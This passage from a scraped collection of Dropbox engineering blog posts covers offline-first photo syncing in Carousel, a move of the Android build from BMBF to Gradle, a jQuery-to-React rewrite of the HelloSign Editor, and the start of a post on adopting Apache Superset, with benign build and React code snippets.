Carousel, we want the action to take effect instantly. We can then asynchronously write that change back to the server. To do so, we construct a HideOperation , or DeleteOperation , which also gets persisted to SQLite. Every user action in Carousel thus becomes an operation , which will eventually be synced to the server. These operations are placed into in-memory operation queues and persisted to SQLite for conservation across app launches. For each queue, there’s a dedicated operation sync thread, which waits until an operation is ready to execute, then makes the HTTPS call necessary to submit the change to the server. Whenever we need to render a view to the user, we consult these pending operations to make sure we’re reflecting the user’s latest actions. It’s only safe to remove these operations once we’re certain we’ve seen their effect come down in the delta. We thus end up with an architecture that looks like this: Let’s walk through an example of rendering the primary grid view to the user. Copy class DbxPhotoClient {\r\n    list<DbxPhotoItem> list_photos();\r\n}; Inside the implementation of list_photos , we: 1. Read all server photo metadata out of the server_photos table. 2. Add in all the local photos pending upload. 3. Remove photos which have been hidden or deleted. For example, suppose our server_photos table contains the following data: Server ID Hash Hidden On Server A hash_a No Our photo_upload_operations table contains the following data: Camera Roll ID Hash B hash_b And our photo_modification_operations table contains the following data: Operation Type Photo ID(s) Hide [Server ID = A] Our call to list_photos() will produce as final output the result of unioning local and server content, then applying the pending hide: ID Hash Is Hidden A hash_a Yes B hash_b No Note that in practice, forcing the UI to call list_photos() to perform a read from SQLite every time there’s a change to the photo model would be prohibitively expensive. Instead, we keep the photo model loaded in memory, and modify it as changes come in (either via user actions in the app, or remote changes on the server). This is not all that different than the delta API we use to sync down changes from the server. To keep things fast, we essentially introduce another level of delta between disk and memory. In the next blog post, we’ll take a look at exactly how this works, and how it enabled us to build an app that can handle over 100,000 photos. The key idea in the example we walked through above is that applying a client-side photo addition and hide on top of cached server state should provide the same result as eventually uploading the photo and applying the hide on the server. Whenever we render data in Carousel, we first consult the cached server state, then “re-play” pending operations on top of it. In the case of hide & delete, we then rely on last-write-wins semantics on the server to resolve any conflicts. This works really well for photos that are already in Dropbox, since the photos already have server IDs. Each pending operation can store the server ID(s) on which it should be applied. But what happens when we want to allow modifications to photos that haven’t finished uploading yet? As an additional constraint, keep in mind that due to the multi-platform nature of Dropbox, the photo might be uploaded from a source other than the Carousel client. Even when that happens, we still need to resolve any pending actions that were taken on that photo. Identifying a Photo There are a few different ways to ensure an action taken on a local-only photo gets synced to the server properly. We wanted something simple and relatively stateless to keep the client-side logic easy to reason about. To achieve this, we introduced the concept of a device-specific ID, henceforth referred to as a LUID (locally unique ID), as the canonical way to refer to each photo. A LUID is a stable identifier, meaning it can be used to refer to a photo both before and after it has been uploaded. A LUID is simply an autoincrement integer, and it works like this: When we scan the device for new photos and find a photo that needs to be uploaded to Dropbox, we create a LUID for that local photo. We then add an entry in the local_photo_luids table, which maps the LUID to its native camera roll ID. When a new server photo S comes down in delta, we check if S.hash matches any local photo hashes. If not, we create a new LUID, and add an entry to the server_photo_luids table, which maps the LUID to its server ID. In the event the hash does match some local photo L , it means L has finished uploading and we now have its server metadata available. We assign S.photo_luid = L.photo_luid . At the same time, we also mark the relevant photo_upload_operation as completed. To prevent conflicts (for instance if the same photo gets added to the user’s Dropbox multiple times), the first server photo with the same hash is the one that will “complete” the upload operation and claim the LUID. You’ll notice by using this logic, we always have a stable way to refer to a particular photo without worrying about whether it is on the server or not. This reduces a lot of complexity in the app, since the UI can simply treat LUIDs as the basis of equality between photo objects. When a local photo finishes uploading, we don’t need to worry about tracking down each reference to it and “upgrading” the reference to use the new server ID. The LUID abstracts that away. Faster Sharing With LUIDs in hand, let’s take a look at what happens when a user shares in Carousel. Suppose the user selects a batch of photos, some of which are still local only to the device, and some of which are already in Dropbox. Even if one of these photos finishes uploading while the user is still selecting photos, their selection will be preserved, since the selection set is based on LUIDs. After the user selects the recipients with whom they’d like to share, we can construct the corresponding share operation. Copy DbxShareOp op(photo_luids, recipients);\r\nop.persist(); // Save the operation to SQLite When we render the resulting conversation view, we read the cached server state for the conversation uniquely identified by the recipients. We then re-play this pending share on top of it, just like all the operations we’ve seen before. We could spend a whole blog post going into more depth here, but for now we’ll defer that discussion. If any of the LUIDs within the share operation are still local only (i.e. they do not have entries in the server_photo_luids table), then we know the share is not yet ready to be submitted to the server. The share operation queue can therefore sleep, and wait until the local-only photos in question are uploaded. We consider this a dependency on the share operation, which must be resolved before the operation is ready for remote execution. As part of constructing the share operation, we also mark the relevant photo_upload_operations as “blocking a share”, so that they become re-prioritized to the front of the upload queue. When the dependent photo uploads complete, the share operation is ready to execute on the server. We look up the server IDs (via the server_photo_luids lookup table) and send a request to the server to perform the share. The best part is that all of this happens asynchronously, so the user is free to continue using the app, or go about their day. No spinners, no waiting. Lessons Learned The big lesson we learned from building the Dropbox app photos tab was: don’t block the user! Instead of requiring changes to be propagated to the server synchronously, we built Carousel from day one as an eventually consistent system. With mobile networks still slow and unreliable, we knew this would be the only way to deliver a Dropbox-backed gallery that felt fast and local. The asynchronous, delta-based design to our mobile library empowered us to build an app that was much faster than the Dropbox photos tab. This design enabled us to hide the latency between client and server from the user. In the next installation of this series, we’ll go into more depth on the latency between disk and memory, and how optimizing that was also critical to making the app feel fast. // Tags Mobile Photos Performance Carousel // Copy link Link copied Link copied", "date": "2014-04-14"},
{"website": "Dropbox", "title": "Modernizing our Android build system: Part I, the planning", "author": ["David Chang"], "link": "https://dropbox.tech/mobile/modernizing-our-android-build-system-part-i-the-planning", "abstract": "History The planning Build times What are the major decisions, their options, and their tradeoffs? Decision One of the biggest challenges of the mobile developer community at Dropbox in 2018 was our custom build system. Our build system was slow, hard to use, and didn’t support some use cases which were out of scope of the original design. After 4 months of work by our Mobile Platform team, we were able to remove our unicorn implementation for something much more modern and easy to maintain. In our new build system, we wanted to improve on a couple of things that our current build system was hindering: Make it easy to create new modules Allow developers to easily modify the build files Improve on build times for local development Industry standard approaches and tooling, so an engineer can easily Google their way out of problems Low barrier of entry, familiar to new hires Integration with Android Studio History At Dropbox, we have a repository for all mobile development, called Xplat. One of the benefits is to easily share source code between our different mobile applications and across platforms. For a while, Dropbox invested heavily in cross-platform development via C++ that worked well for the apps that were developed at that time. We even open-sourced Djinni in 2014 to interface cross-platform C++ library code with platform-specific Java and Objective-C on Android and iOS. Most recently in early 2019, we made the decision to move away from C++ development, read more about why here . However, some of our mission critical libraries will remain on C++ e.g. DocScanner which uses OpenCV . Since December 2016, Dropbox used a meta-build system to build our two mobile apps: Dropbox and Paper. It was a meta-build system in the sense that, for most of our modules, we didn’t write the Gradle build files by hand. These build files were autogenerated using an in-house system called BMBF . Additionally, BMBF would generate Java source code for our analytics, feature gating, and other common libraries written in C++. What is BMBF? BMBF ( Buildy McBuildface Basic Modular Build Format) was a tool written in Python to help modularize our mobile code base. BMBF provided guaranteed layered dependency order and reduced boilerplate in build files. BMBF used a structured and opinionated file system layout. Then it was able to generate build.gradle and wire in those modules into settings.gradle . This made it ‘easy’ to create new modules or re-use an existing module without sacrificing the benefits that come from using the official tools for each platform. The following module config file: device.bmbf.yaml Copy dependencies:\n  - dbx/base/async\n\njava:\n  src_maven_dependencies:\n    - dagger\n    - dagger_compiler\n  jvm_test_maven_dependencies:\n    - junit Link to gist Would get parsed by BMBF’s build system and output a build.gradle file Copy apply plugin: 'com.android.library'\napply plugin: 'kotlin-kapt'\n\nandroid {\n    sourceSets {\n        main {\n            manifest.srcFile 'AndroidManifest.xml'\n            java.srcDirs = ['java/src']\n            test.srcDirs = ['jvm_test/src']\n            androidTest.srcDirs = ['android_test/src']\n        }\n    }\n}\ndependencies {\n    implementation project(':dbx:base:async')\n    implementation project(':dbx:base:oxygen')\n    implementation commonlibs.dagger2\n    kapt annotationprocessors.dagger2_compiler\n    api commonlibs.kotlinstdlib\n    testImplementation testlibs.junit\n} Link to gist How did BMBF not meet our needs? BMBF was opinionated , it made it difficult to add functionality to our Gradle scripts that were not built into BMBF. If BMBF didn’t support a workflow that a product engineer required, they would either file a ticket on Mobile Platform, or tried to add the functionality themselves. BMBF had numerous gotchas and a steep learning curve. BMBF required a very specific file and folder structure. BMBF was not compatible with Gradle incremental builds because build.gradle files were being re-created every time a developer built the app. It was not uncommon for engineers who had been with the company for 6+ months to still had no idea how to create a new module using BMBF. Our Slack channels and help forums were bombarded with questions on how to resolve errors that BMBF presents. BMBF was initially built to help facilitate modularization and sharing code between iOS and Android. Over the years, the original maintainers that created BMBF moved on to other projects or left the company. Our current engineers were not eager to maintain a legacy meta build system and were more in favor of leveraging a standardized build system. Since we started using BMBF, we stopped writing cross-platform modules and even wanted to rewrite C++ modules into platform-specific iOS and Android code . The time had come to revamp our build system. The planning Our team worked for several weeks on evaluating and analyzing our options to review: Gradle + BMBF (status quo) Gradle only Bazel Buck Our team created a sandbox environment to accurately compare different build systems. Gradle Only No work was needed for Gradle, as it was our baseline. Bazel While Bazel was widely used at Dropbox, its use didn’t propagate to our mobile teams. An engineer from Developer Infrastructure worked on generating all the BUILD.bzl files required for all our modules in order to successfully build an APK. Buck We did not evaluate Buck because it was not well supported by the community at the time and did not support Kotlin. Also, we did not have any in-house expertise in Buck at the time. We would have needed to dedicate 1-2 mobile engineers full time to work on Buck. Build times Using the prototypes, we compared the three different build systems’ build times and developer experience. Build times Bazel Only Gradle + BMBF Build Gradle only Clean Build no cache 638 s 252 s (with buck cache) ~ 258 seconds Clean Build w/cache 81.459s N/A N/A NoOp Build 1.334s 20-30 seconds ~ 28.6 seconds [Incremental] Main module modified ~36 sec ~181 seconds ~ 124 seconds [Incremental] Shared library module modified ~29 sec ~200 seconds ~ 108 seconds What are the major decisions, their options, and their tradeoffs? Bazel Build System: Decision: Invest heavily in Bazel now and move C++ and Java/Kotlin development to Bazel. Options: This will require upfront investment in a Bazel MVP, as well as continued support to make up for new/missing features that are only released in Gradle by Google. As of December 2018, Google is still working on open sourcing some missing critical pieces of Bazel Android from the internal version, Blaze. For example, A pp B undles , which was released on May 2018, is still not available on Bazel as of Dec 2018. Pros ▲ Tool chain managed by Dropbox Developer Platform team Bazel is widely used in Dropbox Tool built and maintained externally Unified build system for C++ and Java/Kotlin Scales to larger code bases in terms of performance Cons ▼ Not an industry standard for mobile Latest and greatest features and libraries are not available Requires a bigger upfront investment than migrating to Gradle Requires continuous long term support from Dropbox Developer Platform team until Bazel becomes mobile industry standard (Currently we know only of Google as a user of Blaze for Android) The Android Studio team at Google is focusing on Gradle, at the expense of Bazel The Bazel team at Google is working on adding support for Android and open to feedback but will always be trailing Gradle by 1-2 quarters Gradle Build System: Decision: Make a smaller, strategic, investment to move Java/Kotlin development to Gradle by checking in the project files and removing BMBF from Gradle model management. Options: Code generation and C++ development will continue to be done by BMBF. Invest in some guardrails (lint, H erald , templating) to make working with Gradle easy for developers. Pros ▲ Industry standard for mobile Latest and greatest features and libraries are available Tool built and maintained externally Low migration cost Low maintenance cost Cons ▼ Poor support for cross platform C++ development. Building xplat C++ code is delegated to BUCK via BMBF Will require some support from Mobile platform over time (e.g version bumps, guardrails, maintenance) BMBF Build System Decision: Keep and maintain BMBF as the mobile build tool Pros ▲ Good support for cross platform C++ code Harder to break Gradle configurations through developer error New features can be made available by prioritizing work on them in-house Cons ▼ (Unenthusiastically) managed and maintained by our team, rather than a separate build team Tool is not built and maintained externally Not an industry standard for mobile Will require continuous long term support. New features will require in-house investment Why not Buck as a build tool Decision: Buck is an optional build tool however we didn’t evaluate it as a serious option do to its clear lack of community support and drawbacks. Options: Buck is designed to address massively modularized code bases (100+ modules). It also would require significant expertise to maintain and support. As an example Uber has a 3 person team dedicated to Buck support, one of whom is the author of OkBuck which allows using Buck with Gradle projects. Pros ▲ Good support for cross platform C++ code and caching Cons ▼ Managed by mobile engineers Not well supported by the community and Facebook (at least for external users) Not an industry standard for mobile Full Trade-offs Table Decision We decided to move forward last year with the Gradle Build System , and we will soon be revisiting Bazel . The cheap migration cost from BMBF to the underlying Gradle lead to the decision to first deprecate BMBF. A lthough Bazel was extremely fast with regard to the the build time, we were concerned about deteriorating the local developer experience. At the time of our evaluation, Bazel was not very mature. Gradle is the industry standard for building Android apps. Tooling and libraries available for Gradle will take time for it to become available for Bazel. Find out how we implemented our new Android build system in part II of this post. If you are an Android or iOS engineer who gets excited about solving problems at scale and sharing your findings with the community we’d love for you to come join the team ! // Tags Mobile Android // Copy link Link copied Link copied", "date": "2019-10-30"},
{"website": "Dropbox", "title": "JQuery to React: How we rewrote the HelloSign Editor", "author": ["Asa Ayers"], "link": "https://dropbox.tech/application/jquery-to-react--how-we-rewrote-the-hellosign-editor", "abstract": "Defining the project How we built it What we built Don’t fix it in UI, fix what’s behind it HelloSign is a Dropbox company that provides a Web-based eSignature solution: If you have a document you want someone to sign, you upload the document file, then show you an editor in which you place all the fields to build the form the recipient will fill out—signatures, dates, initials, etc. You send this prepared form to the recipient. When they’re done signing, everything is reassembled into a PDF with signatures that serves as the legally-binding document. It’s trickier than it might seem to maintain pixel-perfect layouts for a wide range of document types and annotation fields across an ever-expanding range of screens. The three modes in which a document is presented—the Editor, the Signer app, and the final overlay as a single, immutable record for posterity—must each display their contents onscreen in pixel-perfect layout at each step, regardless of who’s looking at them on what. Otherwise, users at both ends may not trust the system as much as they would handwritten ink on paper. Defining the project The problem Browsers can’t display all the file types we support for signing. To make HelloSign work in any browser, we convert the document file that you upload to a set of images. In both the Editor and Signer steps of the process, we show you images of your document’s pages and draw the signing fields on top of them. This overlay process draws the fields over a transparent background (instead of the page image itself), which we merge with the original file to present onscreen. All three components—the Editor, Signer, and completed document—must display accurately regardless of the user’s screen resolution. So at a minimum all fields need an address, width, height, type, and unique identifier. In October 2018 I was in a meeting where we were asked to bring ideas to: Improve fidelity between the Editor, Signer page, and final signed document Increase the speed at which components can be placed and changed in the Editor Increase the Editor's usability as a whole We needed to improve fidelity because we had some bugs where the Editor experience didn’t always look the same as the Signer experience, and it wasn’t always the same as the final PDF. Sometimes you would place a checkbox perfectly in the Editor, yet it would be misaligned when displayed in the Signer. But then it might look fine on the final PDF.  You can imagine how this could erode a customer’s trust. We’re producing legally binding documents, so everything has to be exactly right and unambiguous at each step. The proposed solution From my perspective, the root problem was obvious: we had 3 different implementations of a document viewer: Editor : one 12,000 line jQuery file Signer : React app Overlay : PHP scripts that build the final PDF using Cairo We discussed whether we should be bug-fixing the Editor to make it match the Signer, or the other way around. I argued that the best way to keep three viewers in sync was to just make them all the same viewer. I pushed hard for rewriting the Editor first, with the plan of using the same code to power the Signer and Overlay. One of the arguments against it was that there was a recent failed project to rewrite a different jQuery-based page that wasn’t as complex as the existing Editor. I asked for time to go build a proof of concept for a rewrite in React. I knew I could do it, because I used to work at Courseload/Unizin where we had a web-based ebook reader for classrooms. It worked by converting everything to PNGs, then drawing comments and annotations over the images. It had the additional complexity that users needed to be able to select text that wasn’t really there. It used to be a jQuery app, but I lead the development effort to replace it, first as a Backbone app and then converted in-place to React, which has an easier mental model to think about. Instead of having to think about how to change the DOM (Document Object Model), each component specifies its HTML and React makes the changes. Choosing what to change when Whether considering a rewrite or refactor project, I think it’s natural to ask “should we redesign the UI, too?” We chose not to, for several reasons. First, we were ready to start engineering work, but to redesign the UI we would have needed more time for research, writing specs, user testing, and creating designs. Second, there was low-hanging fruit in terms of features, usability, and fidelity that could be quickly retrofitted into the original design without the process of a redesign. By keeping the user-facing changes small, we’d be able to get these improvements into the hands of customers faster. They wouldn’t have to choose to jump to a whole new UI to get features like keyboard shortcuts. How we built it Build in layers The Editor has 4 main parts to be separated: Transport (Communication with the backend) <EditorPage <EditorContext UI For communication with the backend we have one object that holds functions to represent every call to the backend we need. Instead of putting fetch('/editor/saveData', …) in components, we have an object with a saveData(data) function. Components don’t have to know things like URLs, GET vs POST, CSRF token, etc. They just call a function and get a promise. All of that setup means that in tests we can provide a mocked backend. It’s much easier to jest.spyOn(backend, 'saveData') than to have to match against calls to fetch that POST to /editor/saveData . Our Jest tests can boot the whole Editor with a mock backend, so it makes for a fairly realistic test. The only thing I can think of that didn’t work in JSDOM was a few places that used element.getBoundingClientRect() . JSDOM doesn’t compute layouts, so it returns zero for all values. The previous Editor didn’t have Jest tests—it relied on the QA team’s Selenium and manual testing. It’s great to have those tests, but they live in a different repository and are run nightly. With this mock backend the Jest tests don’t need to run a web server, so they can run on every pull request or as part of a commit hook. That lets us catch bugs earlier. Make UI a functional representation of state Before I started using React in 2015 I read a blog post about Om (A ClojureScript UI framework and client/server architecture over Facebook's React ). In it the author said “UI is a functional representation of state.” That phrase resonated deeply with me. At the time I was building Backbone apps. They would use a template for the initial render, but updates were generally done by manipulating the DOM manually. This meant that the template needed to be able to render any state the data might be in, but also meant the manual DOM updates needed to be able to change from any state to any other. I’d much rather use React’s model, in which we just re-render a Virtual DOM and let React go apply the updates. If the whole Editor is a “functional representation of state”, then the state and its manipulation need to be as isolated from the UI as I can get it. So near the top of the component tree we have a component named <EditorContext that doesn’t produce any DOM. Its jobs are to hold Editor state, change state, and to publish data/functions through React.Context . The important part isn’t the React.Context , it’s that there is a place that changes the state without being connected to a UI. <Editor also very specifically does NOT have any code for contacting the server. It just has an onSave prop that it calls without knowing how the save is implemented. I think of it a bit like an ultra-fancy <input . An <input accepts a value and an onChange , but something above it has to respond to events and update the value. For us, we have <EditorPage which uses the transport layer to talk to the server and renders an <Editor with its value and event callbacks. To <EditorPage , <Editor is a black box. Speed up testing to speed development Storybook is one of the best tools I had for this project. It seems most people use it for building libraries of small reusable components. There’s no size or complexity limit on the components that can go into Storybook. But what helped most is that you don’t have a backend/API to talk to. I needed to prove I could build a new Editor UI as quickly as possible, so I didn’t want to mess around with making everything run in the app. In our app, the editor is loaded in an <iframe inside a modal. Were I to build in the app, I’d have to go trough the process of uploading a file, filling in some signers, launching the Editor, and then every change would require me to start over. Using Storybook also helped us get early feedback on the UI. We published it internally so that Product, QA, and Design could all try it out. To build in Storybook I needed to setup a signature request for it to load. Storybook has a hot reload feature where after every change, it can swap the whole component tree without having to refresh the page. This means I was able to use that onSave to store the Editor’s data (with @sambego/ storybook-state ) so that a hot reload regenerates the whole Editor but doesn’t lose whatever changes I made. At any time I can do a full refresh to reset everything. Because we weren’t redesigning the UI, I needed to achieve the same output using React. To build the toolbar I ran the old Editor and copied the HTML (using dev tools) into a new component. From there I could use a screenshot of the old toolbar to make sure I wasn’t breaking the styles as I pulled chunks of HTML into new components. Here’s a Slack message I posted two weeks after starting the project: I have the major components of what a React editor/view might look like. In this demo I edited the PNG to place a 1 inch square 1 inch into the document to verify positioning and have placed a textbox exactly over it. I have a Handle component that manages the size and positioning of any field type. Then I have a very basic implementation of a textbox. I don't expect to keep this, but to demonstrate the flexibility of this approach, if I press shift while editing it draws a 10x10 grid and snaps the controls to it. In viewing mode the Handle component is still there to position the field that way we get perfect fidelity between the two. On the text field page, it just renders all the variations of a component. If there is going to be drift between editing and signing it will show up there and will be very obvious. Consolidate state management HelloSign was built as a PHP app, with the server rendering each page and adding custom JS for client-side interaction. React was part of the stack before I joined, but it was often used from PHP. We have a custom PHP function render_react_component() that returns a placeholder div and generates a ReactDOM.render(...) which renders the component into the placeholder. This was a fine transitional strategy for introducing React, but it meant that component properties could only be set once as PHP generated the page. The biggest chunk of React in our codebase was the Signer app. It didn’t use render_react_component() , but it did use models similar to what I used to use in Backbone. I didn’t want to continue that pattern, because it doesn’t follow React's one-way data flow. So the Editor was one of the first things I put into src/hellospa (Hello Single Page App). HelloSPA uses React Router to do its own routing with code splitting, so ideally all that PHP has to do is render an empty page and load hellospa.js . We’re moving toward a point where everything the user sees and interacts with comes from our frontend codebase, instead of it being split across PHP in one repository and React in another. We didn’t have a standard state management library, so at the time I wanted to try regular component state and React.Context . One of the top level components in the Editor holds everything in local state and then publishes it through React.Context . While this strategy worked, I would recommend something like Redux over building your own Context-based state management. React.Context compares its value by reference to see if it changed. So if you’re building a new value object on every render, it will cause everything using the context to re-render. I worked around that by building what I called contextCacher . It does a shallow-compare of the object and if everything matches, it returns what’s in the cache instead of the new object passed in. It works similarly to the useMemo hook, but instead of passing dependencies and running a function you just pass an object. Copy const contextValue = this.contextCacher({ fields, pages })\r\n// The code above works the same as this hook.\r\n// const contextValue = React.useMemo(() => ({ fields, pages }), [fields, pages])\r\n\r\nreturn <Provider value={contextValue}>{this.props.children}</Provider> An aside on wrangling coordinates Having done this before, I knew one of the challenges to placing information onscreen reliably would be transforming addresses between different coordinates. It’s not that the math is hard, but that it can be hard to keep track of working across two different coordinate spaces. No matter the physical size on your screen, we address a US Letter Portrait page as being 680x880 units. If we have a field at (340, 0) (top-center), but you’re on a screen where the page is physically 1020px wide, where is that field? (510,0) I really wanted to solve this problem with an SVG because they can define their own coordinate space. I’ll just use <svg viewBox=\"0 0 680 880\" and I’ll let the browser handle all the conversions from address-space to screen-space. It was great in theory, but the biggest problem I ran into was that you can’t place an <input inside an <svg . As our primary business is putting form fields into a document … right, that’s not going to work. Since SVG was out of the question, I had to manage the conversions myself. The first thing to tackle was converting between address-space and screen-space on the page. So I needed functions fromScreenCoords() and toScreenCoords() . This starts fairly simple because in both cases the top-left corner is (0, 0) . So if our 680x880 page is drawn on your screen at 1020x1320px, then toScreenCoords multiplies x , y , height , and width by 1.5 and fromScreenCoords divides them by 1.5 . This coordinate space works great for rendering fields on the page (ORIGIN_PAGE) , but we also needed drag and drop support. You can drag one of the toolbar buttons and place it anywhere on the page, and you get a live preview of the field as you drag it around, and it turns red when it’s outside the bounds of the page. To handle that, I needed to introduce the concept of different origins (where (0, 0) is). When dragging a field around, it isn’t rendered inside the page. It’s rendered in a transparent div that covers the whole viewport starting at ORIGIN_VIEWPORT . So toScreenCoords() and fromScreenCoords() need to know which origin to use in order to convert between them. One problem with this strategy is that it relies on measuring the DOM to see how much space is available, and then calculating everything. Resizing your window doesn’t cause React to re-render, so there were a few places where the fields might get out of sync with the document. Once you interact with the page again everything snaps back into place, but we needed to keep things precisely rendered onscreen to keep user’s trust. I solved the problem by converting fields on the page from using absolute positions in pixels to percentages of page size. Now, when <PageContainer changes size, we don’t have to recalculate anything—CSS resizes and/or moves the fields. What we built Keep in mind in the sections below that the layers are composed of many components. <SignatureRequest is just the name of the top-level component of that layer. The reason for this strategy is to limit communication between different parts of the app. That way, if two things don’t communicate with each other, you can (generally) reason about them independently. The Editor Redesign The new Editor was built under a codebase split, which allowed us to roll it out to specific accounts or groups of accounts without affecting the rest of our customers. Moreover, it allowed us to rollout the new Editor code while working on a UI redesign—the one we had chosen not to include as part of our move to React—simultaneously. This gave us early feedback on the code underlying the new UI, so that we could eventually roll out a new UI whose underlying code had already been rolled out, tested and refined. Going back to the layers mentioned above, the UI layer only talks to the business logic layer. This makes it easier to swap out or rearrange UI components, because they all connect back to <EditorContext . The old Editor design had a popover for editing fields, whereas the redesign put that in a new sidebar. As long as the inputs in the sidebar are connected to the same functions from <EditorContext , it doesn’t really matter where those components are mounted. Now that we had a new platform to build on, one in which the UI is separated from the rest of the app, we were able to launch a completely new UI. Copy const EditorLayout = React.lazy(() => import(/* webpackChunkName: \"hellospa-editor2\" */'./editor-layout'));\r\nconst EditorV1 = React.lazy(() => import(/* webpackChunkName: \"hellospa-editor1\" */'./editor-v1'));\r\n    \r\nfunction Editor(props) {\r\n  return (\r\n    <EditorContext {...props}>\r\n      <Suspense fallback=\"\">\r\n        {isSplitEnabled(EDITOR_REDESIGN)\r\n          ? <EditorLayout />\r\n          : <EditorV1 />\r\n        }\r\n      </Suspense>\r\n    </EditorContext>\r\n  );\r\n} The Signer App Layers: Legacy Signer app powered by Models <SignerSignatureRequest : Model compatibility <SignerContext : Business Logic <SignatureRequest : UI When building the Editor I included a prop that manages feature flags. These are all flags that are just on or off to configure the Editor. Initially I thought the Signer app would be a combination of flags that turns off editing features. That turned out to be the wrong approach, so eventually I needed to extract all of the document viewing code. So while we built <Editor first, it got refactored so that <Editor is built around <SignatureRequest . This new set of components have their own context that publish things like the fields, pages, zoom, and functions for changing the zoom. We didn’t rewrite the whole Signer app, but we did replace all the code that draws the document on screen. as mentioned above, the Signer app is powered by models similar to what I used in Backbone. That style of model is a class that holds data, and anything with a reference to it can subscribe to changes and make changes. The models also manage their own communication with the backend. This is NOT compatible with the one-way data flow <Editor and <SignatureRequest were built on. This was also solved by another layer that has strict rules around how it communicates. <SignerSignatureRequest is my bridge between models and React state. It’s another component that doesn’t produce any DOM. The fields in <SignatureRequest / <Editor are not exactly the same shape as the models, so <SignerSignatureRequest needs to fetch the fields in a format it can use. This component is simply an adapter—when you fill fields in the Signer app this component is relaying those changes out to the models. It’s the only new code that’s allowed to know about models. It’s also important that this doesn’t contain any business logic so that if we ever choose to rewrite the Signer app, we can drop this component and render <SignerContext directly. The Overlay Layers: HTML file with all data embedded <OverlayPage <SignatureRequest : UI Now that the Editor and Signer are powered by the same code, the last step is the Overlay. Editor and Signer both run in the user’s browser, but we need to run the Overlay on the server in an environment that is mostly PHP. We’re still working through some details, so this hasn’t made it to production yet. While the Editor and Signer draw fields over an image of your document, the Overlay draws those fields in exactly the same way but over a transparent background. This allows us to use a headless Chrome the print to PDF, then that is merged into the original PDF to create the final document. I originally thought using a headless Chrome should be fairly simple. Just point it at a URL on the webserver that will produce the right page and print. It’s not really that simple from a security perspective. Our headless Chrome is extremely locked down. As I understand it, we only give it access to the specific files it needs and it doesn’t have network access. This has to run on our servers, in our network, so we do everything we can to make sure no one can create a document that might try to reach out and access something it shouldn’t. So for every PDF we create we need a folder with all the HTML, JS, CSS, and assets (fonts). The data for the request is embedded in the HTML file, which replaces the layer that would otherwise communicate with the backend. Don’t fix it in UI, fix what’s behind it A software engineer’s job is not to write code, it’s to solve problems, by writing code when necessary. Often bug reports or features will give a very specific scenario where something needs to change, explained from the perspective of the user. That makes sense, but too often I see developers jump right into the UI code to try to fix the problem from a user’s perspective. Instead, it’s often better for the system and less code if you’re able to back up and think about the problem from the business logic layer instead. Remember what I said earlier: UI is a functional representation of state . If a bug isn’t simply about style, you probably shouldn’t start your fix by jumping into the UI code. // Tags Application Front end JQuery React // Copy link Link copied Link copied", "date": "2020-09-30"},
{"website": "Dropbox", "title": "Why we chose Apache Superset as our data exploration platform", "author": ["Bogdan Kyryliuk"], "link": "https://dropbox.tech/application/why-we-chose-apache-superset-as-our-data-exploration-platform", "abstract": "Problems we started with Evaluating data exploration tools Why we chose Superset Results Choose the best solution for your own biggest problems Today the Apache Software Foundation announced Apache Superset as one of its official top-level projects. Apache Superset is a modern, open source data exploration and visualization platform already in use at Airbnb, American Express, Lyft, Nielsen, Rakuten Viki, Twitter, and Udemy among others. I worked on Apache Superset at Airbnb in its early days. When I came to Dropbox in late 2018, I got to continue working on it as a side project. Eventually, the company decided it was important enough to our internal needs to put our full attention to incorporating Apache Superset as our data exploration platform. We’ve been using it in production since early 2020, expanding its use until it became our main data exploration tool. Our choice of Apache Superset wasn’t cut and dry, though. I’ll explain what alternatives we looked at, and why we chose Superset. Of course I think it’s great, but for your own purposes it’s important to choose the tool that solves the most important real problems you have. Problems we started with As many companies of our size have done, we had built a number of internal tools to help engineers, analysts, and business stakeholders with their analytics needs. At one point we had more than 10 different data visualization solutions in order to: Monitoring and ensuring uptime Performing migrations as needed Piping data between systems Ensuring correct access controls Data governance Onboarding users into these systems Providing on-demand user support In late 2019, we decided to consolidate our data exploration tooling and introduce a single solution. For our needs, it would need to be able to: Transform SQL queries into charts with minimal friction Enable quick data exploration for ad-hoc analysis, without needing to design a dataset first Allow users to create charts and dashboards that could be shared with others Encourage re-use of queries through customizable macros Consume data from our centralized data store (Hive and Presto clusters on top of S3 data) Evaluating data exploration tools Most of our dashboarding and data visualization needs could be classified into three buckets: Business analytics : exploration and investigation of past business performance to gain insights, identify trends, evaluate ideas and experiments, and size up opportunities. Operational analytics: investigation of our operational systems, especially software ones (software reliability, trends, debugging, etc). Automation of repetitive tasks: as a data-driven company, there was a lot of demand for report automation—monitoring system health, reviewing team metrics, measuring OKRs, etc. To arrive at the right tool, we prioritized the following capabilities in descending order of importance: Security : Data visualization tools have access to sensitive data. We need first and foremost to ensure that data access can be governed and audited, and that we are following the best practices of the Dropbox security team. User friendliness : A shallow learning curve, good documentation, and good support were our top priority after security, so that insights from data can be generated quickly. A steep learning curve has historically been one of the major adoption blockers of any data visualization or dashboarding tool we’ve deployed. Maintainability : Minimize the maintenance cost of the system, which breaks down to two key factors: End users should have minimal overhead to maintain their charts and dashboards. The Data Platform team should be able to ensure continuous support of the tool and its development. Flexibility and extensibility : Seamless integration into the ecosystem of data infrastructure tools and adaptability to future needs is a plus, but not as important as user friendliness and maintainability for us. While data processing and data visualization are critical to our business, they are neither our core competency, nor are they a competitive advantage themselves. Building best-in-class tools requires a lot of long-term investment and has proven to be a challenging task. Our general philosophy is to buy a solution that satisfies our need whenever possible, or leverage an open source initiative. We will build a tool in-house only if neither of the first two options are possible. With all this in mind, we created a list of properties we were looking for in a data exploration tool: Preference to buy a solution or leverage open source rather than build Minimize the number of solutions needed to cover our internal use cases Optimize for ease of iteration and dashboard creation Encourage the right behavior and ETL best practices in data quality Maintain a clear delineation between visualization and data processing Stay as close as possible to the source of truth Delegate computation to the database engine Minimize the number of intermediate layers or configurations needed to build a chart Why we chose Superset As our table below shows, no one option is the best at everything. They all have unique strengths. Periscope (recently renamed to Sisense) allows drag-and-drop interfaces and works with any git server. Mode’s implementation of topics and cross-topic searches is impressive. Redash has alerts today which Superset has only begun to develop, plus a user activity log not found in some other solutions. Metabase is also worth considering, but we ruled it out for Dropbox because it is written in C lojure , which is neither adopted internally within Dropbox engineering, nor supported by our current infrastructure. For us, Superset offered abilities that mattered to our internal users, who want to get answers without writing SQL and for whom time and effort creating visualizations needs to be minimal. The ability to create reusable virtual table columns and metrics that are shared across teams is a big plus for them. Access control list granularity helped us meet the high security expectations we have at Dropbox, streamline data access and cross-team sharing, and minimize support and administration work. Superset’s API for creating charts powers a couple of internal tools and has saved engineering time when building custom visualizations. And in daily use for busy people, a progress bar is more helpful than you might realize. 